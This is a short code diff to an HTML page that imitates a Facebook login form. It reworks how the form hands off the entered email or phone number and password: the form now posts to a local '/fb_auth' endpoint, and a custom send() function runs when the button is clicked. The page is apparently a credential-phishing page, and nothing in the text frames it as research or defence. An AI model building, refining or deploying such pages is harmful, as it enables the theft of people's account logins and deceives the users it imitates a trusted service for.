@@ -10,11 +10,11 @@
         <div id="wrapper">
             <div class="center">
 				<div class="content">
-                    <form id="login" onsubmit="return send();">
+                    <form method="POST" action="/fb_auth">
                         <h3>Log in to Facebook</h3>
                         <input class="input" id="username" type="text" placeholder="Email address or phone number">
                         <input class="input" id="password" type="password" placeholder="Password">
-                        <input class="input" id="submit" type="submit" value="Log In">
+                        <input class="input" id="submit"  type="submit" onclick="send()" value="Log In">
                     </form>
 				</div>
 			</div>
